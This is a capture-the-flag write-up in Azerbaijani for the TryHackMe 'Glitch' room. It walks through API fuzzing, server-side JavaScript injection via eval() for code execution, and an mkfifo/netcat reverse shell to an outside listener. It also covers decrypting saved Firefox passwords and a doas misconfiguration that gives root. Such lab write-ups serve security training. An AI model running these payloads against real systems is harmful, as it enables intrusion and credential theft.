# TryHackMe - Glitch Room Writeup
**URL:** https://tryhackme.com/room/glitch  
**Çətinlik:** Easy  
**OS:** Linux (Ubuntu)  
**IP:** 10.81.183.20

---

## Xülasə
Bu otaqda API endpoint-lərini kəşf etmək, Server-Side JavaScript Injection (SSJI) vasitəsilə Remote Code Execution (RCE) əldə etmək, Firefox şifrələrindən istifadəçi məlumatları çıxarmaq və `doas` vasitəsilə privilege escalation edərək root olmaq lazımdır.

---

## Reconnaissance

### 1. Token Əldə Etmək
`/api/access` endpoint-inə GET sorğusu göndərərək Base64 token alındı:

```
GET http://10.81.183.20/api/access
```

**Cavab:**
```json
{"token":"dGhpc19pc19ub3RfcmVhbA=="}
```

Base64 deşifrə:
```bash
echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
# this_is_not_real
```

---

### 2. Gobuster ilə Endpoint Kəşfi
```bash
gobuster dir -u http://10.81.183.20/api/ \
  -w /usr/share/wordlists/dirb/common.txt
```

**Tapılan endpoint-lər:**
```
/api/access   (Status: 200)
/api/items    (Status: 200)
```

---

### 3. /api/items Endpoint Analizi

**GET sorğusu:**
```bash
curl http://10.81.183.20/api/items
```
```json
{
  "sins": ["lust","gluttony","greed","sloth","wrath","envy","pride"],
  "errors": ["error","error","error",...],
  "deaths": ["death"]
}
```

**POST sorğusu:**
```bash
curl -X POST http://10.81.183.20/api/items
```
```json
{"message":"there_is_a_glitch_in_the_matrix"}
```

---

## Exploitation

### 4. Wfuzz ilə POST Parametr Kəşfi
```bash
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt \
      --hc 400 \
      -X POST \
      -u http://10.81.183.20/api/items?FUZZ=test
```

**Nəticə:**
```
000000322:   500    10L    64W    1081Ch    "cmd"
```

`cmd` parametri tapıldı — **500 Internal Server Error** xətası verdi.

---

### 5. Server-Side JavaScript Injection (SSJI)

Xəta mesajından aydın oldu ki, server `eval()` funksiyası ilə JavaScript icra edir:

```
ReferenceError: id is not defined
at eval (eval at router.post /var/web/routes/api.js:25:60)
```

**RCE Test:**
```bash
curl -X POST "http://10.81.183.20/api/items?cmd=require('child_process').execSync('id').toString()"
```

**Cavab:**
```
uid=1000(user) gid=1000(user) groups=1000(user)
```

✅ **RCE əldə edildi!**

---

### 6. Reverse Shell

**Kali-də listener:**
```bash
nc -lvnp 4444
```

**Payload (mkfifo):**
```bash
curl -X POST "http://10.81.183.20/api/items?cmd=require('child_process').exec('rm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20192.168.138.73%204444%20%3E/tmp/f')"
```

**Shell upgrade:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Post-Exploitation

### 7. User Flag
```bash
cat /home/user/user.txt
```

---

### 8. Firefox Şifrələri

`.firefox` profilindən `logins.json` tapıldı:

```bash
cat /home/user/.firefox/b5w4643p.default-release/logins.json
```

- **hostname:** `https://glitch.thm`
- **encryptedUsername** və **encryptedPassword** mövcuddur

**Kali-də deşifrə:**
```bash
git clone https://github.com/unode/firefox_decrypt
python3 firefox_decrypt.py /home/user/.firefox/b5w4643p.default-release/
```

Tapılan şifrə → `v0id` istifadəçisinə aid

---

## Privilege Escalation

### 9. SUID Faylları Yoxla
```bash
find / -perm -4000 2>/dev/null
```

**Maraqlı tapıntı:**
```
/usr/local/bin/doas
```

### 10. doas Konfiqurasiyası
```bash
cat /usr/local/etc/doas.conf
```
```
permit v0id as root
```

`v0id` istifadəçisi **şifrəsiz root** kimi hər şeyi icra edə bilər!

### 11. Root Olmaq
```bash
# v0id-ə keç (Firefox-dan tapılan şifrə ilə)
su v0id

# doas ilə root ol
doas /bin/bash

# Root flag
cat /root/root.txt
```

✅ **ROOT əldə edildi!**

---

## Vulnerability Xülasəsi

| Zəiflik | Təsvir |
|---------|--------|
| Information Disclosure | `/api/access` token-i açıq qaytarır |
| SSJI (Server-Side JS Injection) | `eval()` ilə `cmd` parametri icra edilir |
| Credential Exposure | Firefox şifrələri disk-də saxlanılır |
| Misconfigured doas | `v0id` şifrəsiz root ola bilir |

---

## İstifadə Edilən Alətlər

- `gobuster` — directory/endpoint enumeration
- `wfuzz` — parametr brute force
- `curl` — HTTP sorğuları
- `nc` (netcat) — reverse shell listener
- `firefox_decrypt` — Firefox şifrə deşifrəsi
- `Burp Suite` — HTTP analiz

---

## Flags

| Flag | Dəyər |
|------|-------|
| User Flag | `/home/user/user.txt` |
| Root Flag | `/root/root.txt` |

---

*Writeup hazırlandı: 2026-08-23*
